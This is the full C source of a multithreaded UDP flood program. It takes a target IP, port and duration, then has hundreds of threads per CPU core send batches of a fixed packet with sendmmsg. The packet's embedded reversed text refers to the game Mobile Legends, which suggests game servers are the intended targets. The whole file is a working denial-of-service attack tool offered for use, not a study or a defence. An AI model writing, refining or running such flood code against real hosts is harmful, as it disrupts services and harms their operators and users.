#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <errno.h>
#include <signal.h>

#define PAYLOAD_SIZE 44
#define BATCH_SIZE 256
#define THREAD_MULTIPLIER 200

static const unsigned char data[PAYLOAD_SIZE] = {
    0x01, 0x71, 0xe9, 0xa8, 0x0e, 0xc2, 0x49, 0x8d, 0x4d, 0x7c, 0x33, 0x0e, 0xf0, 0x08, 0x2e, 0x61,
    0x62, 0x6f, 0x6d, 0x20, 0x54, 0x53, 0x45, 0x62, 0x20, 0x45, 0x48, 0x74, 0x2e, 0x53, 0x44, 0x4e,
    0x45, 0x47, 0x45, 0x6c, 0x20, 0x45, 0x4c, 0x49, 0x42, 0x4f, 0x6d, 0x01
};

volatile sig_atomic_t running = 1;
char *target_ip;
int target_port;

void *timer_thread(void *arg) {
    int duration = *((int *)arg);
    sleep(duration);
    running = 0;
    return NULL;
}

void set_cpu_affinity(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpuset) != 0) {
        perror("sched_setaffinity");
    }
}

void *attack_thread(void *arg) {
    int core_id = *((int *)arg);
    set_cpu_affinity(core_id);

    struct sockaddr_in server_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(target_port)
    };
    
    if (inet_pton(AF_INET, target_ip, &server_addr.sin_addr) <= 0) {
        perror("inet_pton");
        return NULL;
    }

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return NULL;
    }

    int sendbuf = 2 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
    fcntl(sock, F_SETFL, O_NONBLOCK);

    struct mmsghdr msgs[BATCH_SIZE];
    struct iovec iov[BATCH_SIZE];
    
    for (int i = 0; i < BATCH_SIZE; i++) {
        iov[i].iov_base = (void *)data;
        iov[i].iov_len = sizeof(data);
        msgs[i].msg_hdr = (struct msghdr){
            .msg_name = &server_addr,
            .msg_namelen = sizeof(server_addr),
            .msg_iov = &iov[i],
            .msg_iovlen = 1
        };
    }

    while (running) {
        sendmmsg(sock, msgs, BATCH_SIZE, 0);
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        return EXIT_FAILURE;
    }

    target_ip = argv[1];
    target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
    int thread_count = num_cores * THREAD_MULTIPLIER;

    pthread_t timer;
    pthread_create(&timer, NULL, timer_thread, &duration);

    pthread_t *threads = malloc(thread_count * sizeof(pthread_t));
    int *core_ids = malloc(thread_count * sizeof(int));

    for (int i = 0; i < thread_count; i++) {
        core_ids[i] = i % num_cores;
        pthread_create(&threads[i], NULL, attack_thread, &core_ids[i]);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    pthread_join(timer, NULL);
    free(threads);
    free(core_ids);
    return EXIT_SUCCESS;
}
